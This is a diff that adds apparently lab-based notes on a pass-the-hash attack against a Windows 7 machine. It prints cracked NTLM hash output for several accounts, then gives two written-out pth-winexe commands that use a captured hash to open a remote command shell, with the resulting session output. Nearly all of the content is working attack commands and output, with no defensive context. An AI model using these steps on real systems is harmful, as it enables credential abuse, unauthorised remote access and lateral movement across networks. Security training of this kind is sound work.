@@ -1,0 +1,65 @@
+ONCE YOU HAVE THE HASHES, YOU CAN PROCEED WITH PASSING THE HASH
+===============================================================
+root@alice:~# john --show hashes.txt 
+Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+offsec::1001:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+HomeGroupUser$::1002:aad3b435b51404eeaad3b435b51404ee:37eb6b58fd3ec9fab4300bd9ec52a9a6:::
+victim::1003:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+username::1004:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+lowpriv::1005:aad3b435b51404eeaad3b435b51404ee:f671043ba08e88500d2eb5279ac65e53:::
+
+7 password hashes cracked, 0 left
+
+PASSING THE HASH IN WINDOWS => 2 METHODS
+========================================
+METHOD 1
+========
+root@alice:~# pth-
+pth-curl       pth-rpcclient  pth-smbget     pth-winexe     pth-wmis
+pth-net        pth-smbclient  pth-sqsh       pth-wmic       
+root@alice:~# export SMBHASH=aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e
+root@alice:~# pth-winexe -U offsec% //192.168.209.178 cmd
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::588b:dbbe:ed05:b760%11
+   IPv4 Address. . . . . . . . . . . : 192.168.209.178
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.209.2
+
+Tunnel adapter isatap.{AD019509-1D1C-452E-899C-54CF10CB9A9A}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 9:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+C:\Windows\system32>exit
+
+
+ALTERNATIVELY YOU CAN USE THIS METHOD
+=====================================
+METHOD 2
+========
+root@alice:~# pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e  //192.168.209.178 cmd
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
